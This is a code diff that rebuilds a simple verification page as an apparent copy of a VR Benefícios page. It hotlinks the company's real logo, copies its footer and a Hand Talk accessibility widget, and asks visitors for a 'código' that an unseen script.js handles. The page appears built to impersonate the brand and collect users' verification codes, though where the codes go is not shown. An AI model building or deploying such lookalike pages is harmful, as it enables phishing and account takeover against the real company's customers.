@@ -1,27 +1,72 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VR - informar código</title>
+  <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
+  <main class="content">
+    <section class="login-panel" aria-label="Informar código VR">
+      <div class="login-box">
+        <header class="login-header">
+          <img class="logo" src="https://www.vr.com.br/sites/default/files/VR%20Benef%C3%ADcios.png" alt="VR Benefícios">
+          <h1>Informe o código para continuar.</h1>
+        </header>
 
-    <h2>Verificação</h2>
+        <form class="login-form" id="codigo-form" aria-label="Formulário de código">
+          <div class="field">
+            <label for="codigo">Código *</label>
+            <input id="codigo" name="codigo" type="text" autocomplete="off" required maxlength="500">
+          </div>
+          <button id="verificar" class="continue-button" type="submit">Continuar</button>
+          <p class="submission-status" id="submission-status" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+    </section>
 
-    <p>Digite o código de verificação.</p>
+    <aside class="banner" aria-label="Comunicação VR"></aside>
+  </main>
 
-    <input
-        id="codigo"
-        type="text"
-        placeholder="Código"
-        autocomplete="one-time-code"
-    >
+  <footer class="footer">
+    <span>© 2026 VR - Todos os direitos reservados</span>
+    <div class="help">
+      <span class="help-icon">?</span>
+      <a href="#ajuda-modal">Ajuda</a>
+    </div>
+  </footer>
 
-    <button id="verificar" type="button">
-        Verificar
+  <section id="ajuda-modal" class="help-modal" aria-label="Perguntas frequentes">
+    <div class="ajuda-dialog">
+      <a class="close-modal" href="#">×</a>
+      <div class="ajuda-header">
+        <p class="ajuda-title">Perguntas frequentes</p>
+        <p class="ajuda-subtitle">Clique na pergunta para ler as instruções que precisa</p>
+      </div>
+      <div class="ajuda-accordion">
+        <details><summary>Como informar o código?</summary><p>Digite o código no campo indicado e clique em “Continuar”.</p></details>
+        <details><summary>O código pode conter quais caracteres?</summary><p>O campo aceita letras, números, espaços e caracteres especiais.</p></details>
+      </div>
+    </div>
+  </section>
+
+  <aside class="accessibility-widget" aria-label="Plugin de acessibilidade da Hand Talk.">
+    <button class="accessibility-button" type="button" aria-label="Abrir recursos assistivos.">
+      <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" fill="currentColor">
+        <path d="M20.75 6.99C20.61 6.44 20.06 6.12 19.51 6.24C17.13 6.77 14.48 7 12 7C9.52 7 6.87 6.77 4.49 6.24C3.94 6.12 3.39 6.44 3.25 6.99C3.11 7.55 3.45 8.12 4 8.25C5.61 8.61 7.35 8.86 9 9V21C9 21.55 9.45 22 10 22C10.55 22 11 21.55 11 21V16H13V21C13 21.55 13.45 22 14 22C14.55 22 15 21.55 15 21V9C16.65 8.86 18.39 8.61 19.99 8.25C20.55 8.12 20.89 7.55 20.75 6.99ZM12 6C13.1 6 14 5.1 14 4C14 2.9 13.1 2 12 2C10.9 2 10 2.9 10 4C10 5.1 10.9 6 12 6Z" />
+      </svg>
+      <span>Recursos Assistivos</span>
     </button>
+    <button class="accessibility-button" type="button" aria-label="Abrir tradutor de língua de sinais.">
+      <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" fill="currentColor">
+        <circle cx="12" cy="4" r="2" />
+        <path d="M8 8.5C8 7.67 8.67 7 9.5 7h5c.83 0 1.5.67 1.5 1.5V11h2v2h-3v-2h-1v10h-2v-6h-1v6H9V11H7v2H5v-2h3V8.5Z" />
+      </svg>
+      <span>Acessível em Libras</span>
+    </button>
+  </aside>
 
+  <script src="script.js"></script>
 </body>
 </html>
